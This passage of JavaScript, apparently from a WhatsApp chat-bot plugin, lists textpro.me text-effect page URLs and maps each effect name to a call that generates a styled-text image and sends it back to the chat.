let fishtext = `https://textpro.me/koi-fish-text-effect-online-888.html`
let breadeffect = `https://textpro.me/bread-text-effect-online-887.html`
let matrixtext = `https://textpro.me/matrix-style-text-effect-online-884.html`
let bloodtext = `https://textpro.me/horror-blood-text-effect-online-883.html`
let lighttextneon = `https://textpro.me/neon-light-text-effect-online-882.html`
let thunder = `https://textpro.me/create-thunder-text-effect-online-881.html`
let boxtext = `https://textpro.me/3d-box-text-effect-online-880.html`
let neoneffect = `https://textpro.me/neon-text-effect-online-879.html`
let warningtext = `https://textpro.me/road-warning-text-effect-878.html`
let steeltext = `https://textpro.me/3d-steel-text-effect-877.html`
let bokeheffect = `https://textpro.me/bokeh-text-effect-876.html`
let neontext = `https://textpro.me/green-neon-text-effect-874.html`
let advancedglow = `https://textpro.me/free-advanced-glow-text-effect-873.html`
let watereffect = `https://textpro.me/dropwater-text-effect-872.html`
let walltext = `https://textpro.me/break-wall-text-effect-871.html`
let gifttext = `https://textpro.me/chrismast-gift-text-effect-869.html`
let honeyeffect = `https://textpro.me/honey-text-effect-868.html`
let bagdrug = `https://textpro.me/plastic-bag-drug-text-effect-867.html`
let horrortext = `https://textpro.me/horror-gift-text-effect-866.html`
let slabstext = `https://textpro.me/marble-slabs-text-effect-864.html`
let marbleeffect = `https://textpro.me/marble-text-effect-863.html`
let coldtext = `https://textpro.me/ice-cold-text-effect-862.html`
let juicetext = `https://textpro.me/fruit-juice-text-effect-861.html`
let metaltext = `https://textpro.me/rusty-metal-text-effect-860.html`
let goldtext = `https://textpro.me/abstra-gold-text-effect-859.html`
let biscuiteffect = `https://textpro.me/biscuit-text-effect-858.html`
let bageleffect = `https://textpro.me/bagel-text-effect-857.html`
let woodeffect = `https://textpro.me/wood-text-effect-856.html`
let fitext = `https://textpro.me/sci-fi-text-effect-855.html`
let rainbowtext = `https://textpro.me/metal-rainbow-text-effect-854.html`
let gemtext = `https://textpro.me/purple-gem-text-effect-853.html`
let shinymetaltext = `https://textpro.me/shiny-metal-text-effect-852.html`
let jewelrytext = `https://textpro.me/yellow-jewelry-text-effect-851.html`
let metaltexthot = `https://textpro.me/hot-metal-text-effect-843.html`
let goldentext = `https://textpro.me/hexa-golden-text-effect-842.html`
let metaltexteroded = `https://textpro.me/eroded-metal-text-effect-834.html`
let carboneffect = `https://textpro.me/carbon-text-effect-833.html`
let candytext = `https://textpro.me/pink-candy-text-effect-832.html`
let metaltextblue = `https://textpro.me/blue-metal-text-effect-831.html`
let gemtextblue = `https://textpro.me/blue-gem-text-effect-830.html`
let metaltextblack = `https://textpro.me/black-metal-text-effect-829.html`
let glowingmetal = `https://textpro.me/3d-glowing-metal-text-effect-828.html`
let marveltext = `https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html`
let stone1 = `https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html`
let glitch1 = `https://textpro.me/create-a-glitch-text-effect-online-free-1026.html`
let retro = `https://textpro.me/create-3d-retro-text-effect-online-free-1065.html`
let glass = `https://textpro.me/broken-glass-text-effect-free-online-1023.html`
let papercut = `https://textpro.me/create-art-paper-cut-text-effect-online-1022.html`
let papercolor = `https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html`
let windowfog = `https://textpro.me/write-text-on-foggy-window-online-free-1015.html`
let wings = `https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html`
let bear = `https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html`
let graffititext = `https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html`
let luxurygold1 = `https://textpro.me/3d-luxury-gold-text-effect-online-1003.html`
let sand = `https://textpro.me/sand-engraved-3d-text-effect-989.html`
let tiktokglitch = `https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html`
let tahun = `https://textpro.me/1917-style-text-effect-online-980.html`
let exposure = `https://textpro.me/double-exposure-text-effect-black-white-976.html`
let neon = `https://textpro.me/neon-text-effect-online-963.html`
let galaxywolf = `https://textpro.me/create-wolf-logo-galaxy-online-936.html`
let ninja = `https://textpro.me/create-ninja-logo-online-935.html`
let matrix = `https://textpro.me/matrix-style-text-effect-online-884.html`
let thunder1 = `https://textpro.me/create-thunder-text-effect-online-881.html`
let dropwater = `https://textpro.me/dropwater-text-effect-872.html`
let ice = `https://textpro.me/ice-cold-text-effect-862.html`
let chrome = `https://textpro.me/3d-chrome-text-effect-827.html`

try {
if(jenis === 'sketch') {
await textpro(sketch, isi).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'magma') {
await textpro(magma, isi).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'stone') {
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(stone, [isi, isi2]).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'glitch') {
if(!text.includes("/")) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(glitch, [isi, isi2]).then(async res => {
conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'retro') {
if(!text.includes("/")) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(retro, [isi, isi2]).then(async res => {
conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'glass') {
await textpro(glass, isi).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'papercut') {
await textpro(papercut, isi).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'papercolor') {
await textpro(papercolor, isi).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'wings') {
await textpro(wings, isi).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'bear') {
await textpro(bear, isi).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'graffititext') {
await textpro(graffititext, isi).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'graffiti') {
if(!text.includes("/")) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(graffiti, [isi, isi2]).then(async res => {
conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'luxurygold') {
await textpro(luxurygold, isi).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'sand') {
await textpro(sand, isi).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'tiktokglitch') {
if(!text.includes("/")) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(tiktokglitch, [isi, isi2]).then(async res => {
conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === '1917') {
await textpro(tahun, isi).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'neon') {
await textpro(neon, isi).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'galaxywolf') {
if(!text.includes("/")) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(galaxywolf, [isi, isi2]).then(async res => {
conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'ninja') {
if(!text.includes("/")) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(ninja, [isi, isi2]).then(async res => {
conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'matrix') {
await textpro(matrix, isi).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'thunder') {
await textpro(thunder, isi).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'dropwater') {
await textpro(dropwater, isi).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'ice') {
await textpro(ice, isi).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
} else if(jenis === 'chrome') {
await textpro(chrome, isi).then(async res => {conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '')})
//////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////
} else if(jenis === 'dmetal') {
await textpro(dmetal, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'whitegold') {
await textpro(whitegold, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'dgiraffe') {
await textpro(dgiraffe, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'lightglow') {
await textpro(lightglow, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'texteffects') {
await textpro(texteffects, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'batman') {
await textpro(batman, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'dretro') {
await textpro(dretro, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'thorlogo') {
await textpro(thorlogo, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'lightglitch') {
await textpro(lightglitch, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'neonlight') {
await textpro(neonlight, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'glowingneon') {
await textpro(glowingneon, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'goldenancient') {
await textpro(goldenancient, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'leddisplay') {
await textpro(leddisplay, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'newyear') {
await textpro(newyear, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'treetext') {
await textpro(treetext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'christmascandy') {
await textpro(christmascandy, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'christmastext') {
await textpro(christmastext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'merrychristmas') {
await textpro(merrychristmas, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'ddeep') {
await textpro(ddeep, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'onlinecountry') {
await textpro(onlinecountry, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'americanflag') {
await textpro(americanflag, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'dsci') {
await textpro(dsci, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'rainbowcolor') {
await textpro(rainbowcolor, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'dwater') {
await textpro(dwater, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'halloweenskeleton') {
await textpro(halloweenskeleton, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'spooky') {
if(!text.includes("/")) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(spooky, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'cinematic') {
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(cinematic, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'sketcht') {
await textpro(sketch, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'bluecircuit') {
await textpro(bluecircuit, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'spacetext') {
await textpro(spacetext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'metallic') {
await textpro(metallic, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'captain') {
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(captain, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'ciencefiction') {
await textpro(ciencefiction, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'gameclassic') {
await textpro(gameclassic, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'greenhorror') {
await textpro(greenhorror, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'transformer') {
await textpro(transformer, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'berrytext') {
await textpro(berrytext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'layeredtext') {
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(layeredtext, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'thundertext') {
await textpro(thundertext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'magm') {
await textpro(sketch, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'stonecracked') {
await textpro(stonecracked, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'dneon') {
await textpro(dneon, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'impressiveglitch') {
await textpro(impressiveglitch, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'glitch') {
if(!text.includes("/")) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(glitch, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'harrypotter') {
await textpro(harrypotter, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'embossedtext') {
await textpro(embossedtext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'glasstext') {
await textpro(glasstext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'artpaper') {
await textpro(artpaper, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'dgradient') {
await textpro(dgradient, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'dglossy') {
await textpro(dglossy, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'drealistic') {
await textpro(drealistic, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'watercolor') {
await textpro(watercolor, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'multicolor3d') {
await textpro(multicolor3d, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'neondevil') {
await textpro(neondevil, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'underwatertext') {
await textpro(underwatertext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'blackand') {
await textpro(blackand, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'wonderfulgraffiti') {
await textpro(wonderfulgraffiti, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'graffiti') {
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(graffiti, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'graffitiwall') {
if(!text.includes("/")) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(graffitiwall, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'christmas') {
await textpro(christmas, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'futuristic') {
await textpro(futuristic, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'snowtext') {
await textpro(snowtext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'cloud') {
await textpro(cloud, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'luxurygold') {
await textpro(luxurygold, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'gradienttext') {
await textpro(gradienttext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'blackpinklogo') {
await textpro(blackpinklogo, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'realisticvintage') {
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(realisticvintage, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'realisticcloud') {
await textpro(realisticcloud, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'cloudfly') {
await textpro(cloudfly, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'insand') {
await textpro(insand, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'writingtext') {
await textpro(writingtext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'engraved3d') {
await textpro(engraved3d, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'summery') {
await textpro(summery, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'dglue') {
await textpro(dglue, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'space3d') {
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(space3d, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'darkgold') {
await textpro(darkgold, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'glitchtext') {
if(!text.includes("/")) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(glitchtext, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'ston') {
await textpro(stone, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'lighttext') {
await textpro(lighttext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'matrixtext') {
await textpro(matrixtext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'minioneffect') {
await textpro(minioneffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'pornhub') {
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(pornhub, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'exposuretext') {
await textpro(exposuretext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'dholotext') {
await textpro(dholotext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'avengers') {
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(avengers, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'purpledual') {
await textpro(purpledual, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'marvelstyle') {
if(!text.includes("/")) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(marvelstyle, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'marveltext') {
if(!text.includes("/")) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(marveltext, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'silvertext') {
await textpro(silvertext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'fullluxury') {
await textpro(fullluxury, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'bluemetal') {
await textpro(bluemetal, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'goldtext') {
await textpro(goldtext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'carbontext') {
await textpro(carbontext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'fabriceffect') {
await textpro(fabriceffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'tneoneffect') {
await textpro(tneoneffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'yearcards') {
await textpro(yearcards, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'metaltextlogo') {
await textpro(metaltextlogo, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'avatargold') {
await textpro(avatargold, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'logo3d') {
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(logo3d, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'cards3d') {
await textpro(cards3d, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'firetext') {
await textpro(firetext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'lionlogo') {
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(lionlogo, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'wolflogo') {
await textpro(wolflogo, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'wolfglogo') {
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(wolfglogo, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'ninjalogo') {
if(isi2 === undefined) return m.reply(`Contoh ${prefix+command} ${jenis}/Text1/Text2`)
await textpro(ninjalogo, [isi, isi2]).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'logojoker') {
await textpro(logojoker, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'wickereffect') {
await textpro(wickereffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'leavestext') {
await textpro(leavestext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'sparkletext') {
await textpro(sparkletext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'skeletoneffect') {
await textpro(skeletoneffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'foilballoon') {
await textpro(foilballoon, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'steeleffect') {
await textpro(steeleffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'glosstext') {
await textpro(glosstext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'denimeffect') {
await textpro(denimeffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'greentext') {
await textpro(greentext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'purpletext') {
await textpro(purpletext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'stonetext') {
await textpro(stonetext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'rockeffect') {
await textpro(rockeffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'lavaeffect') {
await textpro(lavaeffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'shinyglass') {
await textpro(shinyglass, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'americatext') {
await textpro(americatext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'robotd2') {
await textpro(robotd2, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'equalizertext') {
await textpro(equalizertext, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'toxiceffect') {
await textpro(toxiceffect, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'sparklingjewelry') {
await textpro(sparklingjewelry, isi).then(async res => { conn.sendMessage(m.chat, {image: { url: res},caption: 'Done'}, '') })
} else if(jenis === 'caketext') {
